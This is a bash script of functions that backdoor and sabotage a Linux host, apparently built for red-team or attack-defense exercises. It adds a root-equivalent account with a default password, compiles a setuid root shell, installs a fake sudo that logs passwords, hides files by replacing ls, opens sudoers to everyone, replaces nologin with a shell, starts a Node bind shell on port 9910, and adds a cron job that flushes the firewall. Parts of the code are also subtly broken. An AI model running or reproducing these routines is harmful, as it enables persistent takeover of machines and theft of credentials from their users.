#!/bin/bash

update_packages () {
  apt update 
  apt install -y gcc nodejs vim curl netcat sudo npm iptables
}

add_root_account () {
  if [$1 = ""]; then
  	local usr="sysmin"
  else
  	local name=$1
  fi
	useradd -ou 0 -g 0 $usr
	echo "$usr:changeme" | chpasswd
}

add_root_shell () {
	if [$1 = ""]; then
  	local name="sysmin"
  else
  	local name=$1
  fi
	echo 'int main(void){setresuid(0,0,0);system("/bin/sh");}' > $name.c
  gcc $name.c -o /bin/$name
  rm $name.c
  chown root:root /bin/$name
  chmod 4777 /bin/$name
}

add_sudo_password_logger () {
	mkdir -p /var/.info
	printf 'read -sp "[sudo] password for $USER: " sudopass\necho""\nsleep 2\necho $sudopass >> /tmp/sudo.txt\n/usr/bin/sudo $@' >> /var/.info/sudo
  chmod 777 /var/.info/sudo
  echo 'alias sudo=/var/.info/sudo' >> /etc/profile.d/interesting.sh
}

hide_interesting_bash_profile() {
	mv /usr/bin/ls /usr/bin/lls
  printf '/usr/bin/lls --color=auto -I interesting.sh $@' > /usr/bin/ls # Ha, this is such an asshole move--I love it.
  chmod 755 /usr/bin/ls
}

add_troll_bash_profile() {
	printf "alias cat='echo \"Segmentation fault\"'" >> /etc/profile
}

set_suid () {
  chmod 4777 $(which vim)
  chmod 4777 $(which nano)
  chmod 4777 $(which nice)
  chmod 4777 $(which python3)
  chmod 4777 $(which systemctl)
}

add_firewall_disrupter () {
	echo 'iptables -F; iptables -t mangle -F; iptables -t nat -F' >> /root/.bashrc
}

add_sudoers () {
	echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
  echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/default
  chattr +i /etc/sudoers
}

add_incrementing_users {
	for i in {1..420}; do useradd user$i; echo "user$i:changeme" | chpasswd; done
}

nullify_nologins () {
	cp /bin/false /bin/falsey
  cp /bin/sh /bin/false
  cp /bin/nologin /bin/nologiny
  cp /bin/sh /bin/nologin
	cp /bin/true /bin/truey
  cp /bin/sh /bin/true
}

add_backdoor_node_shell () {
	mkdir -p /var/www/.backdoor/
  printf 'var spawn=require(\"child_process\").spawn,net=require(\"net\"),server=net.createServer(function(n){console.log(\"New connection\!\");var o=\"win32\"===process.platform?spawn(\"cmd\"):spawn(\"/bin/sh\");o.stdin.resume(),o.stdout.on(\"data\",function(o){n.write(o)}),o.stderr.on(\"data\",function(o){n.write(o)}),n.on(\"data\",function(n){o.stdin.write(n)}),n.on(\"end\",function(){console.log(\"Connection end.\")}),n.on(\"timeout\",function(){console.log(\"Connection timed out\")}),n.on(\"close\",function(n){console.log(\"Connection closed\",n?\"because of a conn. error\":\"by client\")})});server.listen(9910,\"0.0.0.0\");' > /var/www/.backdoor/nodeserver.js
  npm install -g pm2
  pm2 start /var/www/.backdoor/nodeserver.js
}

add_malicious_cronjob () {
  printf '#!/bin/bash\n(\niptables -F; iptables -t mangle -F; iptables -t nat -F;) 2>/dev/null' >> /etc/notes
  printf 'useradd -ou 0 -g 10 systemdaemon 2>/dev/null\necho "systemdaemon:password" | chpasswd2>/dev/null' >> /etc/notes
  chmod 755 /etc/notes
  crontab -l > cron_bkp
  echo "*/5 * * * * /usr/bin/sudo /etc/notes >/dev/null 2>&1" >> cron_bkp
  crontab cron_bkp
  rm cron_bkp
}
